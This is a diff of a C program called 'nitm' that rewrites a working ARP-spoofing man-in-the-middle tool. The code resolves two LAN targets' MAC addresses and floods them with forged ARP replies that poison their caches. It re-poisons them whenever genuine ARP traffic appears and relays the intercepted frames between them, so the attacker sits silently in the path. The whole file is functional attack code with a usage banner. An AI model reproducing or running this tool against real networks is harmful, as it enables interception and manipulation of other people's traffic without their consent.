@@ -1,317 +1,241 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <pcap.h>
-#include <netinet/in.h>
-#include <netinet/if_ether.h>
 #include <libnet.h>
-#include "nitm.h"
+#include <netinet/if_ether.h>
 
-void get_mac_address(libnet_t *libnet_context, pcap_t *handle, u_int32_t my_ip, struct libnet_ether_addr *my_mac, u_int32_t target_ip, struct libnet_ether_addr *future_target_mac);
-void process_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet);
-void spoof (libnet_t *libnet_context, u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *my_mac);
-void spoof_back(u_char *user, const struct pcap_pkthdr *header, const u_char * packet);
-
-void *pipe_main(void*d);
-void pipe_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet);
+//nitm 2
+char *device = NULL, *str_ip_t1 = NULL, *str_ip_t2 = NULL;
 
 void print_usage();
 
+void format_mac(struct libnet_ether_addr *mac, char* str_mac){
+	sprintf(str_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
+			((struct libnet_ether_addr) *mac).ether_addr_octet[0],
+			((struct libnet_ether_addr) *mac).ether_addr_octet[1],
+			((struct libnet_ether_addr) *mac).ether_addr_octet[2],
+			((struct libnet_ether_addr) *mac).ether_addr_octet[3],
+			((struct libnet_ether_addr) *mac).ether_addr_octet[4],
+			((struct libnet_ether_addr) *mac).ether_addr_octet[5]);
+}
+
+void find_mac_packet(u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
+	void ** params = (void**) user;
+	
+	u_int32_t *ip_t = (u_int32_t *) params[0];
+	struct libnet_ether_addr *mac_t = (struct libnet_ether_addr *) params[1];
+	pcap_t *handle = (pcap_t *) params[2];
+	
+	struct ether_header *eth_header;
+	struct ether_arp *arp_packet;
+	
+	eth_header = (struct ether_header *) packet;
+	
+	if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
+		arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));
+		
+		if(ntohs(arp_packet->ea_hdr.ar_op) == 2 && !memcmp (ip_t, arp_packet->arp_spa, 4)){
+			memcpy(mac_t, eth_header->ether_shost, 6);
+			pcap_breakloop (handle);
+		}
+	}
+}
+
+void find_mac(libnet_t *libnet_ctx, pcap_t *handle, u_int32_t ip_self, struct libnet_ether_addr mac_self, u_int32_t ip_t, struct libnet_ether_addr *mac_t){
+	libnet_ptag_t arp = 0, eth = 0;
+	u_int8_t mac_broadcast[6];
+	
+	memset(mac_broadcast, 0xFF, ETHER_ADDR_LEN);
+	
+	arp = libnet_autobuild_arp(ARPOP_REQUEST, (uint8_t*) &mac_self, (uint8_t*)&ip_self, mac_broadcast, (uint8_t*) &ip_t, libnet_ctx);
+	
+	if(arp == -1){
+		fprintf(stderr, "An error occured while building the ARP header, %s\n", libnet_geterror(libnet_ctx));
+		exit(EXIT_FAILURE);
+	}
+	
+	eth = libnet_build_ethernet(mac_broadcast, (uint8_t*) &mac_self, ETHERTYPE_ARP, NULL, 0, libnet_ctx, 0);
+	
+	if(eth == -1){
+		fprintf(stderr, "An error occured while building the Ethernet header. %s\n", libnet_geterror(libnet_ctx));
+		exit(EXIT_FAILURE);;
+	}
+	
+	void * params[3] = {&ip_t, mac_t, handle};
+	do{
+		printf("Writing ARP request\n");
+		if(libnet_write(libnet_ctx) == -1){
+			printf("An error occured while sending the packet. %s\n", libnet_geterror(libnet_ctx));
+			exit(EXIT_FAILURE);;
+		}
+	}while(pcap_loop(handle, 5, find_mac_packet, (u_char *) params) != -2);
+	libnet_clear_packet(libnet_ctx);
+}
+
+void spoof_mac(libnet_t *libnet_ctx, u_int32_t ip_t, struct libnet_ether_addr mac_t, u_int32_t ip_spoof, struct libnet_ether_addr mac_self){
+	libnet_ptag_t arp = 0, eth = 0;
+		
+	arp = libnet_autobuild_arp(ARPOP_REPLY, (uint8_t*) &mac_self, (uint8_t*) &ip_spoof, (uint8_t*) &mac_t, (uint8_t*) &ip_t, libnet_ctx);
+	
+	if(arp == -1){
+		fprintf(stderr, "An error occured while building the ARP header, %s\n", libnet_geterror(libnet_ctx));
+		exit(EXIT_FAILURE);
+	}
+	
+	eth = libnet_build_ethernet((uint8_t*) &mac_t, (uint8_t*) &mac_self, ETHERTYPE_ARP, NULL, 0, libnet_ctx, 0);
+	
+	if(eth == -1){
+		fprintf(stderr, "An error occured while building the Ethernet header. %s\n", libnet_geterror(libnet_ctx));
+		exit(EXIT_FAILURE);;
+	}
+	
+	if((libnet_write(libnet_ctx)) == -1){
+		printf("An error occured while sending the packet. %s\n", libnet_geterror(libnet_ctx));
+		exit(EXIT_FAILURE);
+	}
+	
+	libnet_clear_packet(libnet_ctx);
+}
+
+void handle_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
+	void ** params = (void**) user;
+	
+	pcap_t* pcap_handle = (pcap_t*) params[0];
+	u_int32_t *ip_t1 = (u_int32_t *) params[1];
+	struct libnet_ether_addr *mac_t1 = (struct libnet_ether_addr *) params[2];
+	u_int32_t *ip_t2 = (u_int32_t *) params[3];
+	struct libnet_ether_addr *mac_t2 = (struct libnet_ether_addr *) params[4];
+	struct libnet_ether_addr *mac_self = (struct libnet_ether_addr *) params[5];
+	
+	struct ether_header *eth = (struct ether_header *) packet;
+	struct ether_arp *arp;
+	
+	if(ntohs(eth->ether_type) == ETHERTYPE_ARP){
+		arp = (struct ether_arp *) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));
+		
+		if((ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY) && 
+				(memcmp(eth->ether_shost, mac_self->ether_addr_octet, 6) != 0) && //not from self
+				((memcmp(arp->arp_spa, ip_t1, 4) == 0) || //from t1 or t2
+				(memcmp(arp->arp_spa, ip_t2, 4) == 0))){	
+			printf("\ntarget sent legit arp reply, spoofing...\n");
+			pcap_breakloop (pcap_handle);
+		}else if((ntohs(arp->ea_hdr.ar_op) == ARPOP_REQUEST) && 
+				(memcmp(eth->ether_shost, mac_self->ether_addr_octet, 6) != 0) &&
+				((memcmp(ip_t1, arp->arp_tpa, 4) == 0) ||
+				(memcmp(ip_t2, arp->arp_tpa, 4) == 0))) {
+			printf("\nSomeone is requesting a targets mac, spoofing...\n");
+			pcap_breakloop (pcap_handle);
+		}
+	}else if(memcmp((*mac_self).ether_addr_octet, eth->ether_dhost, 6) == 0){
+		if(memcmp((*mac_t1).ether_addr_octet, eth->ether_shost, 6) == 0){
+			memcpy(eth->ether_dhost, mac_t2, 6);
+			memcpy(eth->ether_shost, mac_self, 6);
+			printf("1");fflush(stdout);
+			pcap_sendpacket(pcap_handle, packet, header->len);
+		} else if(memcmp((*mac_t2).ether_addr_octet, eth->ether_shost, 6) == 0){
+			memcpy(eth->ether_dhost, mac_t1, 6);
+			memcpy(eth->ether_shost, mac_self, 6);
+			printf("2");fflush(stdout);
+			pcap_sendpacket(pcap_handle, packet, header->len);
+		}
+	}
+}
+
 int main(int argc, char **argv){
-	char *device;
+	
 	char errbuf[PCAP_ERRBUF_SIZE];
-
-	libnet_t *l; //libnet context
-
-	u_int32_t my_ip, ip_target_one, ip_target_two;
-	struct libnet_ether_addr *my_mac, mac_target_one, mac_target_two;
-
-	pcap_t *arp_handle;
-
-	struct bpf_program filter_program;
 	
-	pthread_t pipe_thread;
-
-	if(argc == 4)
-		device = argv[1];
-	else if(argc == 3)
-		device = pcap_lookupdev(errbuf);
-	else{
-		print_usage();
-		exit(1);
-	}
-
-	if(device == NULL){
-		printf("Device error: %s\n", errbuf);
-		exit(1);
-	}
-
-	l = libnet_init(LIBNET_LINK, device, errbuf);
-
-	if(l == NULL){
-		printf("Libnet init error: %s\nAre you root?\n", errbuf);
-		exit(1);
-	}
-
-	ip_target_one = libnet_name2addr4(l, argv[argc - 2], LIBNET_RESOLVE);
-	ip_target_two = libnet_name2addr4(l, argv[argc - 1], LIBNET_RESOLVE);
-	my_mac = libnet_get_hwaddr(l);
-	my_ip = libnet_get_ipaddr4(l);
-
-	arp_handle = pcap_open_live(device, BUFSIZ, 1, -1, errbuf);
-
-	if(arp_handle == NULL){
-		printf("Could not open device %s: %s\n", device, errbuf);
-		exit(1);
-	}
-
-	if(pcap_datalink(arp_handle) != DLT_EN10MB){
-		printf("%s is not an Ethernet device.\n", device);
-		exit(1);
-	}
-
-	pcap_compile(arp_handle, &filter_program, "arp", 0, PCAP_NETMASK_UNKNOWN);
-	pcap_setfilter(arp_handle, &filter_program);
-
-	get_mac_address(l, arp_handle, my_ip, my_mac, ip_target_one, &mac_target_one);
-	get_mac_address(l, arp_handle, my_ip, my_mac, ip_target_two, &mac_target_two);
+	libnet_t *libnet_ctx;
 	
-	void * pipe_params[4] = { device, my_mac, &mac_target_one, &mac_target_two };
+	u_int32_t ip_self, ip_t1, ip_t2;
+	struct libnet_ether_addr mac_self, mac_t1, mac_t2;
+
+	pcap_t *pcap_handle;
+	struct bpf_program filter;
 	
-	pthread_create(&pipe_thread, NULL, pipe_main, pipe_params);
+	for(int i = 1; i < argc; i++){
+		if(strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--interface") == 0 && i+1 < argc){
+			device = argv[i+1];
+		}else if(strcmp(argv[i], "-t1") == 0 || strcmp(argv[i], "--targetone") == 0 && i+1 < argc){
+			str_ip_t1 = argv[i+1];
+		}else if(strcmp(argv[i], "-t2") == 0 || strcmp(argv[i], "--targettwo") == 0 && i+1 < argc){
+			str_ip_t2 = argv[i+1];
+		}else if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0){
+			print_usage();
+			return EXIT_SUCCESS;
+		}
+	}
+		
+	if(device == NULL && (device = pcap_lookupdev(errbuf)) == NULL){
+		fprintf(stderr, "Device error: %s\n", errbuf);
+		return EXIT_FAILURE;
+	}
 	
-	void * params[4] = { my_mac, &ip_target_one, &ip_target_two, arp_handle };
+	if(str_ip_t1 == NULL || str_ip_t2 == NULL){
+		fprintf(stderr, "Target/s not set.\n");
+		return EXIT_FAILURE;
+	}
+	
+	if((libnet_ctx = libnet_init(LIBNET_LINK, device, errbuf)) == NULL){
+		fprintf(stderr, "Libnet init error: %s\n", errbuf);
+		return EXIT_FAILURE;
+	}
+	
+	if((pcap_handle = pcap_open_live(device, BUFSIZ, 1, 1000, errbuf)) == NULL){
+		fprintf(stderr, "Couldn't open device %s: %s\n", device, errbuf);
+		libnet_destroy(libnet_ctx);
+		return EXIT_FAILURE;
+	}
+	
+	if(pcap_datalink(pcap_handle) != DLT_EN10MB){
+		fprintf(stderr, "%s is not an Ethernet device.\n", device);
+		pcap_close(pcap_handle);
+		libnet_destroy(libnet_ctx);
+		return EXIT_FAILURE;
+	}
+	
+	pcap_compile(pcap_handle, &filter, "arp", 1, PCAP_NETMASK_UNKNOWN);
+	pcap_setfilter(pcap_handle, &filter);
+
+	ip_self = libnet_get_ipaddr4(libnet_ctx);
+	ip_t1 = libnet_name2addr4(libnet_ctx, str_ip_t1, LIBNET_RESOLVE);
+	ip_t2 = libnet_name2addr4(libnet_ctx, str_ip_t2, LIBNET_RESOLVE);
+	
+	mac_self = *libnet_get_hwaddr(libnet_ctx);
+	
+	char buf[18] = {0};
+	
+	printf("Asking for mac of %s:\n", str_ip_t1);
+	find_mac(libnet_ctx, pcap_handle, ip_self, mac_self, ip_t1, &mac_t1);
+	format_mac(&mac_t1, buf);
+	printf("%s\n", buf);
+					
+	printf("Asking for mac of %s:\n", str_ip_t2);
+	find_mac(libnet_ctx, pcap_handle, ip_self, mac_self, ip_t2, &mac_t2);
+	format_mac(&mac_t2, buf);
+	printf("%s\n", buf);
+	
+	//remove filter
+	pcap_compile(pcap_handle, &filter, "", 1, PCAP_NETMASK_UNKNOWN);
+	pcap_setfilter(pcap_handle, &filter);
+	
+	void * params[6] = {pcap_handle, &ip_t1, &mac_t1, &ip_t2, &mac_t2, &mac_self};
 	
 	for(;;){
-		spoof (l, ip_target_one, ip_target_two, mac_target_one, my_mac);
-		spoof (l, ip_target_two, ip_target_one, mac_target_two, my_mac);
-		
-		pcap_loop (arp_handle, -1, spoof_back, (u_char *) params);
+		spoof_mac(libnet_ctx, ip_t1, mac_t1, ip_t2, mac_self);
+		spoof_mac(libnet_ctx, ip_t2, mac_t2, ip_t1, mac_self);
+		pcap_loop(pcap_handle, -1, handle_packet, (u_char *) params);
 	}
 	
-	pthread_join(pipe_thread, NULL);
-	
-	pcap_close(arp_handle);
-	libnet_destroy(l);
-	return 0;
-}
-
-void get_mac_address(libnet_t *libnet_context, pcap_t *handle, u_int32_t my_ip, struct libnet_ether_addr *my_mac, u_int32_t target_ip, struct libnet_ether_addr *future_target_mac){
-	libnet_ptag_t arp = 0, eth = 0;
-	u_int8_t broadcast_ether[6];
-	int s = 0;
-
-	memset(broadcast_ether, 0xff, ETHER_ADDR_LEN);
-
-	arp = libnet_autobuild_arp(ARPOP_REQUEST, (u_int8_t *) my_mac, (u_int8_t *) &my_ip, (u_int8_t *) broadcast_ether, (u_int8_t *) &target_ip, libnet_context);
-
-	if(arp == -1){
-		printf("An error occured while building the ARP header. %s\n", libnet_geterror(libnet_context));
-		exit(1);
-	}
-
-	eth = libnet_build_ethernet((u_int8_t *) broadcast_ether, (u_int8_t *) my_mac, ETHERTYPE_ARP, NULL, 0, libnet_context, 0);
-
-	if(eth == -1){
-		printf("An error occured while building the Ethernet header. %s\n", libnet_geterror(libnet_context));
-		exit(1);
-	}
-
-	void * params[3] = { &target_ip, future_target_mac, handle };
-
-	while(s == 0){
-		if(libnet_write(libnet_context) == -1){
-			printf("An error occured while sending the packet. %s\n", libnet_geterror(libnet_context));
-			exit(1);
-		}
-
-		printf("Looking for MAC of %s\n", libnet_addr2name4(target_ip, LIBNET_DONT_RESOLVE));
-
-
-		s = pcap_loop(handle, 10, process_packet, (u_char *) params);
-
-	}
-
-
-}
-
-void process_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
-
-	void ** params = (void**) user;
-
-	u_int32_t *target_ip = (u_int32_t *) params[0];
-	struct libnet_ether_addr *future_target_mac = (struct libnet_ether_addr *) params[1];
-	pcap_t *handle = (pcap_t *) params[2];
-
-	struct etherhdr *eth_header;
-	struct ether_arp *arp_packet;
-
-	eth_header = (struct etherhdr *) packet;
-
-	if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
-		arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));
-
-		if(ntohs(arp_packet->ea_hdr.ar_op) == 2 && !memcmp (target_ip, arp_packet->arp_spa, 4)){
-			memcpy(future_target_mac, eth_header->ether_shost, 6);
-			
-			printf ("Target: %d.%d.%d.%d is at: %02x:%02x:%02x:%02x:%02x:%02x\n", 	
-					arp_packet->arp_spa[0],
-					arp_packet->arp_spa[1],
-					arp_packet->arp_spa[2],
-					arp_packet->arp_spa[3],	
-
-					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[0],
-					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[1],
-					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[2],
-					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[3],
-					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[4],
-					((struct libnet_ether_addr) *future_target_mac).ether_addr_octet[5]);
-
-			pcap_breakloop (handle);
-		}
-	}
-}
-
-void spoof (libnet_t *libnet_context, u_int32_t ip_target, u_int32_t ip_spoof, struct libnet_ether_addr mac_target, struct libnet_ether_addr *my_mac){
-	libnet_ptag_t arp = 0, eth = 0;
-	
-	arp = libnet_autobuild_arp(ARPOP_REPLY, (u_int8_t *) my_mac, (u_int8_t *) &ip_spoof, (u_int8_t *) &mac_target, (u_int8_t *) &ip_target, libnet_context);
-	if(arp == -1){
-		printf("An error occured while building the ARP header: %s\n", libnet_geterror(libnet_context));
-		exit(1);
-	}
-	
-	eth = libnet_build_ethernet((u_int8_t *) &mac_target, (u_int8_t *) my_mac, ETHERTYPE_ARP, NULL, 0, libnet_context, 0);
-	if(eth == -1){
-		printf("An error occured while building the ethernet header: %s\n", libnet_geterror(libnet_context));
-		exit(1);
-	}
-	printf ("Spoofing %s to %s\n", libnet_addr2name4 (ip_spoof, LIBNET_DONT_RESOLVE), libnet_addr2name4 (ip_target, LIBNET_DONT_RESOLVE));
-	
-	if((libnet_write(libnet_context)) == -1){
-		printf("An error occured while sending the packet. %s\n", libnet_geterror(libnet_context));
-		exit(1);
-	}
-	libnet_clear_packet(libnet_context);
-}
-
-void spoof_back(u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
-	void ** params = (void**) user;
-
-	struct libnet_ether_addr *my_mac_ptr = (struct libnet_ether_addr *) params[0];
-	struct libnet_ether_addr my_mac = ((struct libnet_ether_addr) *my_mac_ptr); //doesn't work directly fsr ?!
-	u_int32_t *ip_target_one = (u_int32_t *) params[1];
-	u_int32_t *ip_target_two = (u_int32_t *) params[2];
-	pcap_t *handle = (pcap_t *) params[3];
-	
-	struct etherhdr *eth_header;
-	struct ether_arp *arp_packet;
-	
-	eth_header = (struct etherhdr *) packet;
-	
-	if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
-		arp_packet = (struct ether_arp *) (packet + (ETHER_ADDR_LEN + ETHER_ADDR_LEN + 2));
-		
-		if (	ntohs (arp_packet->ea_hdr.ar_op) == 2 && 
-				memcmp (my_mac.ether_addr_octet, eth_header->ether_shost, 6) &&
-				(!memcmp (ip_target_one, arp_packet->arp_spa, 4) || !memcmp (ip_target_two, arp_packet->arp_spa, 4))) {
-
-			printf ("Target: %d.%d.%d.%d sent legitimate ARP packet. Spoofing...\n", 	
-					arp_packet->arp_spa[0],
-					arp_packet->arp_spa[1],
-					arp_packet->arp_spa[2],
-					arp_packet->arp_spa[3]);
-
-			pcap_breakloop (handle);
-		}
-		
-		if (	ntohs (arp_packet->ea_hdr.ar_op) == 1 && 
-			memcmp (my_mac.ether_addr_octet, eth_header->ether_shost, 6) &&
-			(!memcmp (ip_target_one, arp_packet->arp_tpa, 4) || !memcmp (ip_target_two, arp_packet->arp_tpa, 4))) {
-
-			printf ("Someone is asking for the MAC of one of the targets. Spoofing...\n", 	
-					arp_packet->arp_spa[0],
-					arp_packet->arp_spa[1],
-					arp_packet->arp_spa[2],
-					arp_packet->arp_spa[3]);
-
-			pcap_breakloop (handle);
-		}
-	}
-
-}
-
-void *pipe_main(void *d){
-	void ** params = (void**) d;
-	
-	char *device = (char *) params[0];
-	
-	pcap_t *pipe_handle;
-	char errbuf[PCAP_ERRBUF_SIZE];
-	
-	pipe_handle = pcap_open_live(device, BUFSIZ, 1, -1, errbuf);
-	
-	if(pipe_handle == NULL){
-		printf("Could not open device %s: %s\n", device, errbuf);
-		exit(1);
-	}
-
-	if(pcap_datalink(pipe_handle) != DLT_EN10MB){
-		printf("%s is not an Ethernet device.\n", device);
-		exit(1);
-	}
-	
-	params[0] = pipe_handle;
-	
-	printf("Started pipe thread.\n");
-	pcap_loop (pipe_handle, -1, pipe_packet, (u_char *) params);
-	
-}
-
-void pipe_packet (u_char *user, const struct pcap_pkthdr *header, const u_char * packet){
-	void ** params = (void**) user;
-		
-	pcap_t *handle = (pcap_t *) params[0];
-	struct libnet_ether_addr *my_mac = (struct libnet_ether_addr *) params[1];
-	struct libnet_ether_addr *mac_target_one = (struct libnet_ether_addr *) params[2];
-	struct libnet_ether_addr *mac_target_two = (struct libnet_ether_addr *) params[3];
-	
-	struct etherhdr *eth_header;
-	
-	eth_header = (struct etherhdr *) packet;
-	
-	if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP)
-		return;
-		
-	if(!memcmp((*my_mac).ether_addr_octet, eth_header->ether_dhost, 6)){// am i destination
-		if(!memcmp((*mac_target_one).ether_addr_octet, eth_header->ether_shost, 6)){
-			u_char new_packet[header->len];
-			//set destination to t2
-			memcpy(&new_packet[0], mac_target_two, 6);
-			//set source to me
-			memcpy(&new_packet[6], my_mac, 6);
-			//copy data from original packet
-			memcpy(&new_packet[12], &packet[12], header->len - 12);
-
-		    pcap_sendpacket(handle, new_packet, header->len);
-		}
-		
-		if(!memcmp((*mac_target_two).ether_addr_octet, eth_header->ether_shost, 6)){
-			u_char new_packet[header->len];
-			//set destination to t1
-			memcpy(&new_packet[0], mac_target_one, 6);
-			//set source to me
-			memcpy(&new_packet[6], my_mac, 6);
-			//copy data from original packet
-			memcpy(&new_packet[12], &packet[12], header->len - 12);
-
-		    pcap_sendpacket(handle, new_packet, header->len);
-		}
-	}
+	pcap_close(pcap_handle);
+	libnet_destroy(libnet_ctx);
+	return EXIT_SUCCESS;
 }
 
 void print_usage(){
-	printf("nitm v0.1 by frequem\n");
-	printf("Usage: app <interface> <target_one_ip> <target_two_ip>\n");
-	printf("or app <target_one_ip> <target_two_ip>\n");
-	printf("e.g. app eth0 192.168.0.1 192.168.0.6\n");
+	printf("nitm v0.2 by frequem\n");
+	printf("Usage: nitm -i <interface> -t1 <target_one_ip> -t2 <target_two_ip>\n");
+	printf("or nitm -t1 <target_one_ip> -t2 <target_two_ip>\n");
+	printf("e.g. nitm -i eth0 -t1 192.168.0.1 -t2 192.168.0.6\n");
 }
